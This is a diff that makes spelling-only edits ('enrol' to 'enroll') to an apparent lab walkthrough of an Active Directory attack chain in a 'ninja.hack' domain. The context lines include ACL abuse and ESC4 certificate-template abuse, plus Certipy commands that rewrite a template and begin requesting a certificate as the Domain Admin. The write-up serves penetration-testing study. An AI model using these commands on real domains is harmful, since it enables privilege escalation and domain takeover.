@@ -83,7 +83,7 @@ Read them as a chain rather than three findings:
 olivia.davis  --WriteDacl-->  rachel.philips  (member of Sanin)
 Sanin         --GenericAll->  Jonin           (group over group)
 Jonin         --GenericAll->  CN=SignatureValidation,CN=Certificate Templates,...
-                              ^ ESC4: control of a template you can then enrol from
+                              ^ ESC4: control of a template you can then enroll from
 ```
 
 The `ninja.hack` cast: `alice.johnson` is Hokage and **Domain Admin**;
@@ -141,7 +141,7 @@ Re-authenticate afterwards. Group membership rides in the Kerberos ticket, so a
 ticket issued before this change does not carry Jonin and the next step fails in a
 way that looks like the ACL is wrong.
 
-### 4. ESC4: rewrite the template into ESC1, then enrol
+### 4. ESC4: rewrite the template into ESC1, then enroll
 
 With `GenericAll` on the template object you can make it issue what you want.
 Certipy's `template` action rewrites it to the classic vulnerable shape - enrollee
@@ -152,7 +152,7 @@ proxychains certipy template -u 'rachel.philips@ninja.hack' -p '<new-pw>' \
   -dc-ip <dc-vil> -template SignatureValidation -write-default-configuration
 ```
 
-Then enrol as the Domain Admin, which is what the whole chain was for:
+Then enroll as the Domain Admin, which is what the whole chain was for:
 
 ```bash
 proxychains certipy req -u 'rachel.philips@ninja.hack' -p '<new-pw>' \
